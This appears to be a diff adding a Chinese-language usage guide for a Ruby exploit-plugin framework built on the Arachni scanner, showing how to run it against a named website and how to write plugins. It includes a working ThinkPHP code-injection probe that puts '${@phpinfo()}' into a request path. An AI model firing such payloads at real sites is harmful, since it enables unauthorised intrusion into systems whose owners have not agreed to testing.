@@ -1,0 +1,39 @@
+使用说明：
+	已经把所有的功能逻辑封装在playload.rb中，包括动态加载、多线程、漏洞结构、队列等。
+	同时已经把整个功能整合到了arachni中，只需要开发好插件，通过main.rb进行本地测试。
+	本地测试运行正常的插件，可以直接放到arachni中执行。
+
+1. ruby main.rb 直接运行测试
+	===============
+	main.rb 中的代码:
+
+	# 测试站点
+	url = "http://www.zhhsw.com/" 
+	# 开始测试
+	Playload.run(url, debug=true) 
+	# 打印测试结果
+	Playload.each() do |issue| 
+		puts "Issue detail: " + issue.to_s if issue.is_found
+	end
+	===============
+
+
+
+2. 编写一个Exp：参考exp/2.rb
+	===============
+	exp/2.rb 中的代码：
+
+	# 定义漏洞的一些属性
+	def initialize
+    	@name = "ThinkPHP Exp"
+		... ...
+    end
+	# 进行漏洞验证，发现漏洞后需要@is_found = true
+	def exp(url)
+            uri = URI(url + '/index.php/module/aciton/param1/%24%7B@phpinfo%28%29%7D')
+            response = Net::HTTP.get_response(uri)
+			if response.body.include?('PHP Version') then
+      	  	@is_found = true
+			... ...
+    end
+	===============
